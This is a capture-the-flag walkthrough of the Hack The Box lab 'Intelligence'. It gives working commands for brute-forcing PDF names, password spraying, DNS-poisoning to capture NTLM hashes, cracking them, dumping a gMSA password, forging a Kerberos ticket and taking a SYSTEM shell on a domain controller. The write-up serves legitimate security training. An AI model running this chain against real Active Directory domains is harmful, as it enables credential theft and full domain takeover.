---
title: "Hack The Box: Intelligence Walkthrough"
date: 2025-12-30
categories: [HackTheBox, Active Directory, Windows]
tags: [walkthrough, windows, active directory, medium]
image:
  path: /assets/intel/image.png
---

## Machine Overview
* **Machine Name:** Intelligence
* **Difficulty:** Medium
* **Operating System:** Windows

This is a write-up for the Hack The Box machine **Intelligence**, which was retired on 27 November 2021. This machine demonstrates how metadata leakage, weak operational hygiene, and misconfigured Active Directory permissions can lead to full domain compromise.

Before starting, the hostname was added to the local hosts file:
`10.129.95.154 intelligence.htb dc.intelligence.htb`

---

## Enumeration

### Nmap Scan
Initial enumeration was performed to identify open services:

```shell
nmap -sC -sV -o nmap/intelligence.nmap 10.129.95.154

Open Ports:

53/tcp: DNS

80/tcp: HTTP (Microsoft IIS 10.0)

88/tcp: Kerberos

389/tcp: LDAP

445/tcp: SMB
```

Based on the exposed services (Kerberos, LDAP, SMB), the target is identified as an Active Directory Domain Controller.

## Web Enumeration (Port 80)
![Desktop View](/assets/intel/image1.png){: width="700" height="400" .normal }

The web service hosts a custom IIS website. Two PDF files were initially discovered:

    /documents/2020-01-01-upload.pdf

    /documents/2020-12-15-upload.pdf

The date-based naming scheme suggested a pattern.

PDF Enumeration
I wrote a Python script to brute-force and download all possible PDF files for the year 2020:

```python
import requests
from datetime import datetime, timedelta
import os

BASE_URL = "[http://10.129.95.154/documents](http://10.129.95.154/documents)"
OUTDIR = "downloads"
os.makedirs(OUTDIR, exist_ok=True)

start = datetime(2020, 1, 1)
end = datetime(2020, 12, 30)
current = start

while current <= end:
    filename = f"{current.strftime('%Y-%m-%d')}-upload.pdf"
    url = f"{BASE_URL}/{filename}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print(f"[+] FOUND: {filename}")
            with open(f"{OUTDIR}/{filename}", "wb") as f:
                f.write(r.content)
    except:
        pass
    current += timedelta(days=1)
```
![Desktop View](/assets/intel/image4.png){: width="700" height="400" .normal }
A total of 84 PDF files were discovered.


## Initial Access

### Password Discovery

The PDFs were converted to text to search for credentials:

```shell 
mkdir -p txt
for file in *.pdf; do pdftotext "$file" "txt/${file%.pdf}.txt"; done
grep -iEH -C 2 "password|pass|pwd" txt/*.txt
```
The file 2020-06-04-upload.pdf contained a default password:

```shell
NewIntelligenceCorpUser9876
```
![Desktop View](/assets/intel/image2.png){: width="700" height="400" .normal }

### Metadata Analysis & User Enumeration
Usernames were extracted from the PDF "Creator" metadata:

```shell
exiftool *.pdf | grep Creator | awk '{print $3}' | sort -u > usernames.list 
```

I then used kerbrute to verify these users against the Domain Controller:


```shell
kerbrute userenum --dc 10.129.95.154 -d intelligence.htb usernames.list
```
![Desktop View](/assets/intel/image3.png){: width="700" height="400" .normal }
### Password Spraying

Using the discovered password against the list of valid users:

```shell
crackmapexec smb 10.129.95.154 -u usernames.list -p 'NewIntelligenceCorpUser9876' --continue-on-success
```

```shell
Valid credentials found: Tiffany.Molina
```

### SMB & Active Directory Enumeration
#### Retrieving Files

Accessed the IT share using Tiffany's credentials:

```shell
smbclient -U Tiffany.Molina //10.129.95.154/IT
```

Found a script: downdetector.ps1.

Analysis: The script monitors DNS records starting with web* and performs HTTP requests using default credentials. This is exploitable because any domain user can create DNS records.

### BloodHound Analysis
```shell
bloodhound-python -ns 10.129.95.154 -d intelligence.htb -dc dc.intelligence.htb \
-u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c All
```

A Group Managed Service Account (gMSA) named SVC_INT was identified. The ITSupport group has ReadGMSAPassword rights over it.

## Privilege Escalation
### NTLM Credential Capture

I created a malicious DNS record to point to my attacker IP:

```shell
python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 \
-r webtest.intelligence.htb -a add -t A -d 10.10.14.7 10.129.95.154
```

Using Responder, I captured the NTLMv2 hash of Ted.Graves when the automated script attempted to authenticate to my "web" server.

### Credential Cracking
```shell
john ted_graves.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Password recovered: Mr.Teddy

gMSA Password Extraction
Using Ted's credentials to dump the gMSA password:

```shell
gMSADumper.py -u ted.graves -p 'Mr.Teddy' -d intelligence.htb

```

This provided the NTLM hash for svc_int$.

### Silver Ticket Attack

I generated a Silver Ticket to impersonate the Administrator:

```shell
impacket-getST -spn WWW/dc.intelligence.htb \
-impersonate Administrator intelligence.htb/svc_int$ \
-hashes <hash>

export KRB5CCNAME=Administrator.ccache
SYSTEM Shell
Finally, I used psexec with the Kerberos ticket to gain a SYSTEM shell:
```

```shell
impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb
```

# Conclusion
The attack chain required no software exploits—only the abuse of legitimate Active Directory functionality and information leakage through document metadata.

Happy Hacking XD!